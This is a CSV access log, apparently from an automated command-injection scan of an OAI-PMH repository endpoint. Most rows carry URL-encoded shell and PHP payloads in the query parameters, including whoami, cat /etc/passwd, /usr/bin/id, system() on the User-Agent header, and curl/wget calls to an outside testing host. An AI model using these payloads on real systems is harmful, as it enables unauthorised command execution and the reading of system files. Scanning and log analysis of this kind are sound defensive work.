uuid,timestamp,http_status_code,request_url,response_time,http_version
06d91578-e80f-4c30-a0e3-7d2efc11d0bf,2025-01-28 13:34:57,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22+whoami,46.39 ms,HTTP/1.1
a92e616c-6bb7-4cfb-95ae-eb3780c08399,2025-01-28 13:34:58,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+whoami&metadataPrefix=marc,72.06 ms,HTTP/1.1
3e3a4d1e-6303-4d4c-bfa5-025680c8e51a,2025-01-28 13:34:58,200,http://islandora.io/oai/request?verb=%22+%7C+whoami,48.01 ms,HTTP/1.1
0d4d2c7e-9782-4a20-b607-1461510a58c2,2025-01-28 13:34:59,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22+%7C+whoami,51.89 ms,HTTP/1.1
bdb91dd0-95f0-4169-95e9-491e3c5906a5,2025-01-28 13:34:59,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22+%7C+whoami,53.79 ms,HTTP/1.1
801d331b-3530-43d9-87b3-78eb95471044,2025-01-28 13:34:59,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22+%7C+whoami&set=%22+%7C+whoami,41.12 ms,HTTP/1.1
7c5de9c3-fc0d-451e-b0b1-c76ce6625c16,2025-01-28 13:35:00,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22+%7C+whoami&until=%22+%7C+whoami&set=%22+%7C+whoami,44.01 ms,HTTP/1.1
6c9a30b5-60d2-435f-a9f7-a6de30a0e985,2025-01-28 13:35:00,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C+whoami&metadataPrefix=oai_dc,42.40 ms,HTTP/1.1
810e5914-79ce-4feb-ab21-20fbf00f99f3,2025-01-28 13:35:00,200,http://islandora.io/oai/request?verb=%22+%7C%7C+whoami,58.07 ms,HTTP/1.1
44e830c3-9489-4ccb-8fb0-f4b879169ea0,2025-01-28 13:35:01,200,http://islandora.io/oai/request?verb=ListMetadataFormats,52.57 ms,HTTP/1.1
2415c471-817c-4155-b92e-112709b63c6c,2025-01-28 13:35:01,200,http://islandora.io/oai/request?verb=ListSets,45.96 ms,HTTP/1.1
691c7b7f-90a6-4339-82e5-11107bc76d34,2025-01-28 13:35:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%22+%7C%7C+whoami,64.60 ms,HTTP/1.1
75b74e2a-8086-4340-8fec-434ea94cafcc,2025-01-28 13:35:02,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%22+%7C%7C+whoami&until=%22+%7C%7C+whoami,40.98 ms,HTTP/1.1
2cefae7f-8993-4106-98f3-9099b5b6a7cf,2025-01-28 13:35:02,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22+%7C%7C+whoami&metadataPrefix=marc,50.77 ms,HTTP/1.1
d163ef3a-c50a-4f59-b143-23c9de240f81,2025-01-28 13:35:02,200,http://islandora.io/oai/request?verb=%22%27,59.14 ms,HTTP/1.1
02d6b515-6fb9-4272-a707-56806db54432,2025-01-28 13:35:03,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22%27,47.20 ms,HTTP/1.1
9f18c210-2864-4655-9837-54872dd20da6,2025-01-28 13:35:03,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22%27,46.91 ms,HTTP/1.1
8a955331-b80b-41d7-b23f-21f28a5f0b3f,2025-01-28 13:35:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%27&until=%22%27&set=%22%27,62.51 ms,HTTP/1.1
601ddc7d-56af-4f26-bf99-3ad7f27af9ee,2025-01-28 13:35:04,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%22%27&set=%22%27,58.21 ms,HTTP/1.1
dacb00d6-7b1f-4a5f-9981-871e116d8ece,2025-01-28 13:35:04,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%27&metadataPrefix=marc,57.25 ms,HTTP/1.1
685c76a5-03b2-44ab-b870-f90b8c117aec,2025-01-28 13:35:05,200,http://islandora.io/oai/request?verb=%22%3B+whoami,67.81 ms,HTTP/1.1
c2d803b5-f24e-4fce-a4ce-0e75ae8937da,2025-01-28 13:35:05,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%22%3B+whoami,52.57 ms,HTTP/1.1
7ce531d5-d75a-44d4-a99a-f12896071200,2025-01-28 13:35:05,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%22%3B+whoami,53.50 ms,HTTP/1.1
e605e585-eddf-4eb5-9e6d-96f0e3f541ba,2025-01-28 13:35:06,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%22%3B+whoami&until=%22%3B+whoami,66.42 ms,HTTP/1.1
352b08aa-4b67-4a5b-aaaf-f9b3d62e6d7b,2025-01-28 13:35:06,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%22%3B+whoami&until=%22%3B+whoami,48.58 ms,HTTP/1.1
ea212abd-a867-4940-b2a3-533f93759546,2025-01-28 13:35:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%22%3B+whoami&metadataPrefix=oai_dc,59.23 ms,HTTP/1.1
f0229ecc-aa25-4e00-b41b-b04ffedbd566,2025-01-28 13:35:07,200,http://islandora.io/oai/request?verb=%24%28%60cat+%2Fetc%2Fpasswd%60%29,63.57 ms,HTTP/1.1
e44ae9e2-ea5f-4422-8150-383f09254198,2025-01-28 13:35:07,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29,53.95 ms,HTTP/1.1
a59ba3d3-10ab-4322-b232-4ad2450249f7,2025-01-28 13:35:07,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60cat+%2Fetc%2Fpasswd%60%29,54.41 ms,HTTP/1.1
36c24489-97a0-4223-a174-1eaa9ed1b1ae,2025-01-28 13:35:08,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60cat+%2Fetc%2Fpasswd%60%29&set=%24%28%60cat+%2Fetc%2Fpasswd%60%29,42.23 ms,HTTP/1.1
8dd98c24-80eb-4235-8b96-d630439694c5,2025-01-28 13:35:08,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29,212.00 ms,HTTP/1.1
6b6e9628-b659-4073-bbe7-ee8f5bf89ce0,2025-01-28 13:35:09,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29&metadataPrefix=oai_dc,34.38 ms,HTTP/1.1
b9e81118-ddc8-4864-9e12-ea52444e09bf,2025-01-28 13:35:09,200,http://islandora.io/oai/request?verb=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,37.43 ms,HTTP/1.1
77ecb2f5-e3e9-44be-9314-1578f7d2035c,2025-01-28 13:35:09,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,46.98 ms,HTTP/1.1
38554932-2cd1-4a71-9ba0-330162147110,2025-01-28 13:35:10,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,51.99 ms,HTTP/1.1
03d1579c-0d1d-40ba-886d-6a0498ea7c0b,2025-01-28 13:35:10,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,77.36 ms,HTTP/1.1
61294968-625f-4a0f-82cf-dce0abf10b03,2025-01-28 13:35:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,146.74 ms,HTTP/1.1
4e301e57-0052-4654-b023-b63bcbefa170,2025-01-28 13:35:11,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=oai_dc,38.37 ms,HTTP/1.1
9e489f6b-69fd-4b3e-9752-1f719607e09b,2025-01-28 13:35:11,200,http://islandora.io/oai/request?verb=%24%28%60dir%60%29,61.34 ms,HTTP/1.1
778c0dc0-19c0-4756-b356-a46357a37ad2,2025-01-28 13:35:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60dir%60%29,49.80 ms,HTTP/1.1
9c2a3dbd-aa83-4cf4-b69c-bd2cb41fdfd2,2025-01-28 13:35:12,200,http://islandora.io/oai/request?verb=ListSets,32.49 ms,HTTP/1.1
b73c837d-29b0-4ede-ab4f-55f9f5e2b9be,2025-01-28 13:35:12,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60dir%60%29,61.94 ms,HTTP/1.1
7e369372-b203-4c57-88bb-70b6bc6e4cab,2025-01-28 13:35:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%24%28%60dir%60%29,53.53 ms,HTTP/1.1
a022554d-f86a-4694-a3dc-2dfada32b343,2025-01-28 13:35:13,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60dir%60%29&metadataPrefix=oai_dc,36.46 ms,HTTP/1.1
905f5004-b4f7-447c-b56e-3796ac91e71f,2025-01-28 13:35:13,200,http://islandora.io/oai/request?verb=%24%28%60ls%60%29,56.86 ms,HTTP/1.1
58e9ddb9-4c4e-4c70-aea1-cea8c1dc9a10,2025-01-28 13:35:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats,53.03 ms,HTTP/1.1
3528651e-8cac-4ec8-a6e3-dda344e5dab1,2025-01-28 13:35:14,200,http://islandora.io/oai/request?verb=ListSets,81.34 ms,HTTP/1.1
f33f1fb5-7181-472e-9622-b6624f87937e,2025-01-28 13:35:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%24%28%60ls%60%29,49.73 ms,HTTP/1.1
ec27140f-03af-488c-adba-984d29b6706d,2025-01-28 13:35:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60ls%60%29,98.82 ms,HTTP/1.1
88b8c6d1-6878-472a-a80e-1e8a605daa9e,2025-01-28 13:35:15,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60ls%60%29&metadataPrefix=marc,50.47 ms,HTTP/1.1
8d7815f7-5fd4-4b7c-be9d-f93cba2fe3db,2025-01-28 13:35:16,200,http://islandora.io/oai/request?verb=%24%28%60type+C%3A%5Cboot.ini%60%29,41.91 ms,HTTP/1.1
7d9f539b-d351-434e-824f-2268c9409f86,2025-01-28 13:35:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29,62.54 ms,HTTP/1.1
d5d51b22-fa9b-4c9f-b240-25b397a8dbf3,2025-01-28 13:35:17,200,http://islandora.io/oai/request?verb=ListSets,52.72 ms,HTTP/1.1
edd71487-593c-4fe3-8201-41a8f4884d3d,2025-01-28 13:35:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60type+C%3A%5Cboot.ini%60%29&until=%24%28%60type+C%3A%5Cboot.ini%60%29&set=%24%28%60type+C%3A%5Cboot.ini%60%29,81.33 ms,HTTP/1.1
9abcc097-c9f2-4004-8f23-fa53266d244c,2025-01-28 13:35:17,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60type+C%3A%5Cboot.ini%60%29&set=%24%28%60type+C%3A%5Cboot.ini%60%29,58.19 ms,HTTP/1.1
4f04ec7f-ac81-418e-a241-d06d06af7a0d,2025-01-28 13:35:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29&metadataPrefix=marc,34.03 ms,HTTP/1.1
32ce42a5-e3b4-4a49-97b0-8a54c0518753,2025-01-28 13:35:18,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,52.91 ms,HTTP/1.1
f11f8f6d-1310-43b4-bc98-cf0ac00cb366,2025-01-28 13:35:18,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.98 ms,HTTP/1.1
644592d7-018e-4c84-a0f0-63f4218aca0b,2025-01-28 13:35:19,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,47.30 ms,HTTP/1.1
da849e55-9622-4aa2-86b6-ce8c8ef5b158,2025-01-28 13:35:19,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,49.01 ms,HTTP/1.1
094f65b8-b85f-4a98-940c-a369a6df1e06,2025-01-28 13:35:19,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,49.93 ms,HTTP/1.1
ccf489e4-98a5-445d-bed7-a7a434ad6fd7,2025-01-28 13:35:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=oai_dc,54.55 ms,HTTP/1.1
c2664a36-32ef-4e64-842a-c45bdda47151,2025-01-28 13:35:20,200,http://islandora.io/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,35.06 ms,HTTP/1.1
7fd064ca-6035-43f3-8de4-912efa27aa53,2025-01-28 13:35:20,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,65.58 ms,HTTP/1.1
02b5af24-1349-43f7-9685-98d73af7ff10,2025-01-28 13:35:21,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,55.45 ms,HTTP/1.1
9e2e54cf-12e2-4feb-a70a-37c67ad227ba,2025-01-28 13:35:21,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,52.79 ms,HTTP/1.1
995cfcad-51d6-476e-ba7a-4e637fff75d7,2025-01-28 13:35:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,46.92 ms,HTTP/1.1
ffd847e1-50f3-4704-a56b-9c15d97196ad,2025-01-28 13:35:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&metadataPrefix=oai_dc,35.92 ms,HTTP/1.1
fe406a4d-2f6b-4db9-9e08-d8b508d8585b,2025-01-28 13:35:22,200,http://islandora.io/oai/request?verb=%24%28%60whoami%60%29,56.11 ms,HTTP/1.1
5eda22d2-0c19-4e5b-89a1-01c4f36d96c8,2025-01-28 13:35:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%28%60whoami%60%29,55.02 ms,HTTP/1.1
d8ed5d86-d28c-4a67-b2d8-e9d6bdcf879f,2025-01-28 13:35:23,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%28%60whoami%60%29,51.69 ms,HTTP/1.1
bc247bf4-8ff2-4558-8fd8-ef510ef6928e,2025-01-28 13:35:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,45.54 ms,HTTP/1.1
7c999ab3-9558-4da8-8704-cdcb52744627,2025-01-28 13:35:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60whoami%60%29&until=%24%28%60whoami%60%29,63.08 ms,HTTP/1.1
e1de06cb-277d-4a64-ab42-86cbcc99be54,2025-01-28 13:35:24,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%28%60whoami%60%29&metadataPrefix=oai_dc,51.85 ms,HTTP/1.1
c7aa88d3-0baf-44dd-b2ab-b5315659e8b9,2025-01-28 13:35:24,200,http://islandora.io/oai/request?verb=%24%3B%2Fusr%2Fbin%2Fid,69.77 ms,HTTP/1.1
8da2bfd3-3c32-413b-90f1-5259f962e75e,2025-01-28 13:35:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats,33.94 ms,HTTP/1.1
7acdfc23-e53c-4e07-9209-d7749a945464,2025-01-28 13:35:25,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%3B%2Fusr%2Fbin%2Fid,34.42 ms,HTTP/1.1
cb3471dc-12a9-4077-92a6-6e8200620f66,2025-01-28 13:35:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%24%3B%2Fusr%2Fbin%2Fid,69.61 ms,HTTP/1.1
40a5cbae-72aa-4882-813d-ce132b706e52,2025-01-28 13:35:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid,120.86 ms,HTTP/1.1
84517f89-4d05-4462-9079-e3a3068d7837,2025-01-28 13:35:26,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%3B%2Fusr%2Fbin%2Fid&metadataPrefix=oai_dc,33.03 ms,HTTP/1.1
3fba1718-f463-46d7-8efe-98d43ebce554,2025-01-28 13:35:27,200,http://islandora.io/oai/request?verb=%24%7B%40print%28%22RCEVulnerable%22%29%7D,62.87 ms,HTTP/1.1
78a9cf16-4b21-4c12-9a2f-9c237b0e0feb,2025-01-28 13:35:27,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.53 ms,HTTP/1.1
d0814f07-3cc1-407a-8608-7afeb288b0e6,2025-01-28 13:35:27,200,http://islandora.io/oai/request?verb=ListSets,46.65 ms,HTTP/1.1
95eb0517-e6c4-4277-8f59-ab3a8dc8cc64,2025-01-28 13:35:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%7B%40print%28%22RCEVulnerable%22%29%7D&set=%24%7B%40print%28%22RCEVulnerable%22%29%7D,52.73 ms,HTTP/1.1
aedb0f1c-5175-416a-86cc-d26d7327ae54,2025-01-28 13:35:28,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%7B%40print%28%22RCEVulnerable%22%29%7D&set=%24%7B%40print%28%22RCEVulnerable%22%29%7D,39.04 ms,HTTP/1.1
13a79381-e93d-48c0-8094-97d6f1dad65f,2025-01-28 13:35:28,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D&metadataPrefix=oai_dc,48.69 ms,HTTP/1.1
5ae9140b-22c5-4b0f-a543-cbc3065904d5,2025-01-28 13:35:29,200,http://islandora.io/oai/request?verb=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,61.25 ms,HTTP/1.1
31193ff0-0840-4e5b-9ad0-c50d84c295f2,2025-01-28 13:35:29,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,41.97 ms,HTTP/1.1
e2398f1f-fb5b-489b-b28f-5a24514618aa,2025-01-28 13:35:30,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,89.00 ms,HTTP/1.1
a7f6eb52-259a-4815-8f72-c729190ab25e,2025-01-28 13:35:30,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&set=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,38.64 ms,HTTP/1.1
cb98ff17-a66b-4c6a-8dba-c0354ec8b6c3,2025-01-28 13:35:30,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,66.42 ms,HTTP/1.1
7fa09a23-603f-4526-af79-07c7f1449d9f,2025-01-28 13:35:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&metadataPrefix=marc,59.57 ms,HTTP/1.1
a587aa14-221b-45e4-8fc4-35433d79f417,2025-01-28 13:35:31,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid,33.23 ms,HTTP/1.1
0e08c9bc-efa7-4af4-8b90-0f20c3010250,2025-01-28 13:35:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats,41.98 ms,HTTP/1.1
6ec6286a-a0b6-412a-a982-f09fea85a4b3,2025-01-28 13:35:32,200,http://islandora.io/oai/request?verb=ListSets,30.26 ms,HTTP/1.1
6266ac94-52b5-47c3-b620-486aafe31f36,2025-01-28 13:35:32,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%250A%2Fusr%2Fbin%2Fid&set=%250A%2Fusr%2Fbin%2Fid,64.45 ms,HTTP/1.1
9ddad4a9-eff8-4097-a1e5-a3252a80d49e,2025-01-28 13:35:33,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%250A%2Fusr%2Fbin%2Fid,89.49 ms,HTTP/1.1
48c93a8c-57e0-4fac-ba0e-e5252dcaa6f2,2025-01-28 13:35:33,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid&metadataPrefix=oai_dc,49.68 ms,HTTP/1.1
92b4a760-014a-480d-83db-fd25d680063a,2025-01-28 13:35:33,200,http://islandora.io/oai/request?verb=%250A%2Fusr%2Fbin%2Fid%250A,39.40 ms,HTTP/1.1
